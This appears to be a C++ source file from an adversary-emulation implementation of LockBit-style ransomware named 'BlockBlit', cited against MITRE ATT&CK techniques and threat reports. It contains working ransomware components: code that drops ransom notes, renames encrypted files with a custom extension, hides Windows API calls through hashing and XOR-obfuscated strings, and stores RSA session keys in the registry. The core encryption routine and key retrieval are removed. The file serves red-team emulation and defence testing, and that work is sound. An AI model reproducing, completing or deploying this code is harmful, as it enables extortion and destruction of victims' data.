#include "crypto/xor_obfuscation.hpp"
#include "impact.hpp"
#include "logger.hpp"
#include "registry.hpp"
#include "util/os_util.hpp"
#include "util/string_util.hpp"
#include <format>
#include <vector>
#include <filesystem>

#ifndef NO_WIN_API_HASHING
    #include "util/winapihelper.hpp"
#endif

#define MAX_BUF_LEN 4096 // encrypt up to 4KB

namespace impact {

/*
 * DropRansomNote:
 *      About:
 *          Writes the ransom note to the specified destination directory using the custom ransomware file
 *          extension and ransom note contents from the configuration. The ransom note filename will be
 *          of the format <extension>.README.txt.
 *          Ransom note creation is performed using the CreateFileW and WriteFile API calls.
 *      Result:
 *          Ransom note created at the provided directory with filename <extension>.README.txt.
 *      Returns:
 *          True on success, False otherwise.
 *      MITRE ATT&CK Techniques:
 *          T1486: Data Encrypted for Impact
 *      CTI:
 *          https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://redpiranha.net/news/look-lockbit-3-ransomware
 */
bool DropRansomNote(Config& cfg, const std::wstring& dest_dir) {
    std::wstring dest = std::format(L"{}\\{}.{}", dest_dir, cfg.GetExtension(), XOR_WIDE_LIT(L"README.txt"));
    std::string file_path_str = string_util::wstring_to_string(dest);
    try {
        std::string contents = string_util::wstring_to_string(cfg.GetRansomNoteContents());
        DWORD result = os_util::WriteFileToDisk(dest.c_str(), contents.data(), contents.size());
        if (result != ERROR_SUCCESS) {
            XorLogger::LogError(std::format("{} {}. Error code: {}", XOR_LIT("Failed to create ransom note"), file_path_str, result));
        } else {
            XorLogger::LogDebug(std::format("{} {}.", XOR_LIT("Created ransom note at"), file_path_str));
            return true;
        }
    } catch (...) {
        XorLogger::LogError(std::format("{} {}", XOR_LIT("Unknown exception when dropping ransom note to"), file_path_str));
    }
    return false;
}

/*
 * EncryptFileLb:
 *      About:
 *          Encrypts first max_bytes_to_encrypt bytes of file (or entire file if not large enough) 
 *          using 256-bit AES in CTR mode. Appends IV and AES key to the encrypted file.
 *          If specified, the AES key will be encrypted using the provided RSA key prior to being appending to the
 *          encrypted file.
 *          File access, reads, and writes are performed using the CreateFileW, ReadFile, and WriteFile API calls.
 *          RSA encryption is performed using the Crypto++ library and leverages OAEP padding and SHA1 hash.
 *      Result:
 *          AES-CTR-encrypted file with the custom extension appended to the file path.
 *      Returns:
 *          True on success, False otherwise.
 *      MITRE ATT&CK Techniques:
 *          T1486: Data Encrypted for Impact
 *      CTI:
 *          https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/
 *          https://redpiranha.net/news/look-lockbit-3-ransomware
 */
bool EncryptFileLb(const std::wstring& file_path, unsigned char* key, unsigned char* iv, size_t max_bytes_to_encrypt, const std::vector<unsigned char>& rsa_key, bool encrypt_key) {
    /* Removed for public release */
    return true;
}

/*
 * EncryptFileAndAppendExtension:
 *      About:
 *          Encrypts first 4KB of file (or entire file if less than 4KB) using 256-bit AES in CTR mode. 
 *          Appends IV and AES key to the encrypted file. 
 *          If specified, the AES key will be encrypted using the provided RSA key prior to being appended to the
 *          encrypted file.
 *          Appends the provided extension to the file path via MoveFileW API call if encryption is successful.
 *          File access, reads, and writes are performed using the CreateFileW, ReadFile, and WriteFile API calls.
 *          The random AES key and IV are generated using the BCryptGenRandom API call.
 *          RSA encryption is performed using the Crypto++ library and leverages OAEP padding and SHA1 hash.
 *      Result:
 *          AES-CTR-encrypted file with the custom extension appended to the file path.
 *      Returns:
 *          True on success, False otherwise.
 *      MITRE ATT&CK Techniques:
 *          T1486: Data Encrypted for Impact
 *      CTI:
 *          https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/
 *          https://redpiranha.net/news/look-lockbit-3-ransomware
 *          https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-lockbit
 */
bool EncryptFileAndAppendExtension(const std::wstring& file_path, const std::wstring& extension, const std::vector<unsigned char>& rsa_key, bool encrypt_key) {
#ifndef NO_WIN_API_HASHING
    DWORD error_code;
    FP_MoveFileW moveFileW = (FP_MoveFileW)winapi_helper::GetAPI(0xd834fdd3, XOR_WIDE_LIT(L"Kernel32.dll"), &error_code);
    if (moveFileW == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for MoveFileW. Error code"), error_code));
        return false;
    }
#endif
    
    unsigned char key_buf[AES_KEYLEN];
    unsigned char iv_buf[AES_BLOCKLEN];
    std::string file_path_str = string_util::wstring_to_string(file_path);

    try {
        // generate random key and IV
        encryption::GetRandBytes(key_buf, AES_KEYLEN);
        encryption::GetRandBytes(iv_buf, AES_BLOCKLEN);

        // encrypt file
        if (EncryptFileLb(file_path, key_buf, iv_buf, MAX_BUF_LEN, rsa_key, encrypt_key)) {
            // append file extension
            std::wstring new_path = file_path + L"." + extension;
#ifndef NO_WIN_API_HASHING
            if (moveFileW(file_path.c_str(), new_path.c_str())) {
#else
            if (MoveFileW(file_path.c_str(), new_path.c_str())) {
#endif
                XorLogger::LogDebug(std::format("{} {}", XOR_LIT("Appended extension to"), file_path_str));
                return true;
            } else {
                XorLogger::LogError(std::format("{} {}. Error code: {}", XOR_LIT("Failed to append extension to"), file_path_str, GetLastError()));
            }
        } else {
            XorLogger::LogError(std::format("{} {}. {}.", XOR_LIT("Encryption failed for file"), file_path_str, XOR_LIT("Skipping appending extension")));
        }
    } catch (...) {
        XorLogger::LogError(std::format("{} {}", XOR_LIT("Unknown exception when processing file"), file_path_str));
    }
    return false;
}

/*
 * StoreRsaSessionKeys:
 *      About:
 *          RSA-encrypts the RSA private session key using OAEP padding and SHA1 hashing, and writes the RSA
 *          public session key and encrypted private session key to the registry.
 *          Registry key HKCU\SOFTWARE\BlockBlit is creaed with values "pub" and "entire" that contain 
 *          the DER-encoded RSA public session key and encrypted DER-encoded RSA private session key, respectively.
 *          RSA encryption leverages Crypto++ library.
 *          Registry edits are performed using the RegCreateKeyExW and RegSetValueExW API calls.
 *      Result:
 *          Registry key HKCU\SOFTWARE\BlockBlit created with values "pub" and "entire" containing the DER-encoded
 *          RSA public session key and encrypted DER-encoded RSA private session key, respectively.
 *      MITRE ATT&CK Techniques:
 *          T1027: Obfuscated Files or Information
 *          T1112: Modify Registry
 *      CTI:
 *          https://news.sophos.com/en-us/2020/04/24/lockbit-ransomware-borrows-tricks-to-keep-up-with-revil-and-maze/
 *          https://blog.lexfo.fr/lockbit-malware.html
 *      Other References:
 *          https://www.cryptopp.com/wiki/Keys_and_Formats#High_Level_Objects
 */
void StoreRsaSessionKeys(Config& cfg) {
    /* Key retrieval removed for public release */
    std::vector<unsigned char> encoded_pub_key_bytes;
    std::vector<unsigned char> encrypted_priv_key;

    // Write key bytes to registry
    if (!registry::WriteRegistry(HKEY_CURRENT_USER, XOR_WIDE_LIT(L"SOFTWARE\\BlockBlit"), L"pub", encoded_pub_key_bytes.data(), encoded_pub_key_bytes.size())) {
        throw std::runtime_error(XOR_LIT("Failed to write encoded public session key to registry."));
    }
    if (!registry::WriteRegistry(HKEY_CURRENT_USER, XOR_WIDE_LIT(L"SOFTWARE\\BlockBlit"), L"entire", encrypted_priv_key.data(), encrypted_priv_key.size())) {
        throw std::runtime_error(XOR_LIT("Failed to write encrypted private session key to registry."));
    }
}

} // namespace